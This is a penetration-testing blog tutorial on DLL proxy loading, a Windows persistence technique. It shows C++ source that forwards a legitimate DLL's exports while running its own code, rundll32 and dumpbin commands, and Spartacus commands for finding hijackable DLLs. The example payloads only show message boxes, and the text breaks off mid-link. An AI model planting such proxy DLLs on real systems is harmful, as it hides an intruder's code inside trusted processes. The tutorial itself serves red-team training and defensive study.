---
title: Persistence – DLL Proxy Loading
url: http://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/
source: Over Security - Cybersecurity news aggregator
date: 2025-05-03
fetch_date: 2025-10-06T22:28:32.792144
---

# Persistence – DLL Proxy Loading

[Skip to content](#content)

[Penetration Testing Lab](https://pentestlab.blog/)

Offensive Techniques & Methodologies

Menu

* [Methodologies](https://pentestlab.blog/methodologies/)
  + [Red Teaming](https://pentestlab.blog/methodologies/red-teaming/)
    - [Credential Access](https://pentestlab.blog/methodologies/red-teaming/credential-access/)
    - [Persistence](https://pentestlab.blog/methodologies/red-teaming/persistence/)
* [Resources](https://pentestlab.blog/resources/)
  + [Papers](https://pentestlab.blog/resources/papers/)
    - [Web Application](https://pentestlab.blog/resources/papers/web-application/)
  + [Presentations](https://pentestlab.blog/resources/presentations/)
    - [Defcon](https://pentestlab.blog/resources/presentations/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/presentations/derbycon/)
    - [Tools](https://pentestlab.blog/resources/presentations/tools/)
  + [Videos](https://pentestlab.blog/resources/videos/)
    - [BSides](https://pentestlab.blog/resources/videos/bsides/)
    - [Defcon](https://pentestlab.blog/resources/videos/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/videos/derbycon/)
    - [Hack In Paris](https://pentestlab.blog/resources/videos/hack-in-paris/)
* [Contact](https://pentestlab.blog/contact-the-lab/)
  + [About Us](https://pentestlab.blog/contact-the-lab/about-us/)

Posted on [April 3, 2024April 2, 2024](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/)

# Persistence – DLL Proxy Loading

![Unknown's avatar](https://0.gravatar.com/avatar/9161b274d6d350683293f1e03d228985ac0ff6ac6c89353f4b6bd1a7bc69daf4?s=32&d=identicon&r=G) by [Administrator](https://pentestlab.blog/author/worm1984/).In [Persistence](https://pentestlab.blog/category/red-team/persistence/).[Leave a Comment on Persistence – DLL Proxy Loading](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#respond)

DLL Proxy Loading is a technique which an arbitrary DLL exports the same functions as the legitimate DLL and forwards the calls to the legitimate DLL in an attempt to not disrupt the execution flow so the binary is executed as normal. The technique falls under the category of [DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/) and it is typically utilized as a stealthier method to load an arbitrary DLL without breaking the original operation of a process which might be an indicator of compromise for defenders.

When a process is initiated DLL’s are also loaded and make calls to exported functions as illustrated in the diagram below:

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg)

DLL Loading

The DLL Proxy Loading technique requires an arbitrary DLL that will be planted in the same directory and with the same name of the legitimate DLL and will proxy the same exports as the original DLL. However, the arbitrary DLL will also load the implant code and therefore code will executed under the context of a trusted process.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg)

DLL Proxy Loading

The following DLL code exports the following functions:

1. exportedFunction1
2. exportedFunction2
3. exportedFunction3

```
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) VOID exportedFunction1(int a)
{
    MessageBoxA(NULL, "Pentestlab exportedFunction1", "Pentestlab exportedFunction1", 0);
}

extern "C" __declspec(dllexport) VOID exportedFunction2(int a)
{
    MessageBoxA(NULL, "Pentestlab exportedFunction2", "Pentestlab exportedFunction2", 0);
}

extern "C" __declspec(dllexport) VOID exportedFunction3(int a)
{
    MessageBoxA(NULL, "Pentestlab exportedFunction3", "Pentestlab exportedFunction3", 0);
}
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png)

Trusted DLL

Executing the DLL will verify that the code is running as normal.

```
rundll32 DLL-Proxying.dll,exportedFunction1
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png)

DLL Proxy Loading – Message Box

From the offensive perspective prior to developing an arbitrary DLL, the exported functions of the legitimate DLL needs to be identified. This is feasible with the DLL export viewer.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png)

DLL Export Viewer

Alternatively, Visual Studio contains a binary which can used to retrieve the exported functions.

```
dumpbin.exe /exports C:\temp\DLL-Proxying.dll
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png)

DLL Export – Dumpbin

On the proxy DLL a comment directive in the source code will match the exported functions of the legitimate DLL.

```
#include "pch.h"

#pragma comment(linker, "/export:exportedFunction1=trusted1.exportedFunction1")
#pragma comment(linker, "/export:exportedFunction2=trusted1.exportedFunction2")
#pragma comment(linker, "/export:exportedFunction3=trusted1.exportedFunction3")

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        MessageBoxA(NULL, "DLL Proxy Loading", "DLL Proxy Loading", 0);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png)

DLL Proxy

Similarly, using the *dumpbin* binary will verify the exported functions.

```
dumpbin.exe /exports C:\Users\panag\source\repos\Pentestlab\DLL-Proxying\x64\Release\DLL-Proxying.dll
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png)

DLL Export Function – Dumpbin

Execution of the DLL will verify the exported functions are linked to the trusted DLL.

```
rundll32.exe DLL-Proxying.dll,pentestlab
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png)

DLL Proxy Loading – MessageBox

Accenture has developed a tool call *Spartacus* which can be used to identify DLL Proxy opportunities.

```
Spartacus.exe --mode detect
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png?w=952)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png)

Spartacus – DLL Proxy Detection

In conjunction with Process Monitor it is also feasible to identify DLL Hijacking opportunities and export the output to a CSV file.

```
Spartacus.exe --mode dll --procmon Procmon64.exe --pml test.plm --csv ./output.csv --exports . --verbose
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spart...